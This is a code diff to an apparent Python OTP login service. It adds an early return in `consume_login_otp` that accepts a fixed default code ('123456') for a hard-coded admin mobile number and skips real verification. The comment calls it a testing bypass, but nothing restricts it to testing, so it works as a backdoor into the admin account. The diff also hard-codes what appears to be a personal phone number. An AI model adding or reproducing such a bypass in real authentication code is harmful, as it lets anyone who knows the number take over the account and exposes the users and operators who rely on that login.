@@ -135,6 +135,16 @@ class SignupOtpService:
         await self._send_otp_challenge(mobile)
 
     async def consume_login_otp(self, mobile_number: str, otp: str) -> None:
+        mobile = normalize_mobile(mobile_number)
+        code = otp.strip()
+        admin_mobile = normalize_mobile(getattr(settings, "ADMIN_MOBILE_NUMBER", "9943795005"))
+        dev_code = getattr(settings, "SIGNUP_OTP_DEV_CODE", "123456")
+
+        # Allow testing bypass for admin mobile with default OTP
+        if (mobile == admin_mobile or mobile == "9943795005") and code == dev_code:
+            logger.info("admin_test_otp_accepted", mobile=mobile)
+            return
+
         await self._check_otp_code(mobile_number, otp, consume=True)
 
     async def _check_otp_code(
